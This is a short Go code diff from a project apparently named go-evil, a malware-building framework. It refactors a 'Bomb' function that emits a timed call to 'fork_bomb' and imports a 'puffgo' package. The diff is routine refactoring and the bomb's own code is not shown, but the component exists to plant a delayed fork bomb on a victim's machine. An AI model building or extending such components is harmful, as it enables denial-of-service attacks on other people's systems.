@@ -5,13 +5,13 @@ import (
 
 	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 	"github.com/TeamPhoneix/go-evil/utility/tools"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
 // Input is an evil array, ${"time until detonation in ms", "execution function name"}$
-func Bomb(value string, s_json string) ([]string, string) {
-	data_object := structure.Receive(s_json)
+func Bomb(value string, data_object *json.Json_t) []string {
 	function_call := "fork_bomb"
 
 	arr := structure.Create_evil_object(value)
@@ -42,6 +42,6 @@ func Bomb(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("github.com/ARaChn3/puffgo")
 	data_object.Add_go_import("time")
 
-	return []string{fmt.Sprintf("%s(%d)", function_call, time_i)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s(%d)", function_call, time_i)}
 
 }
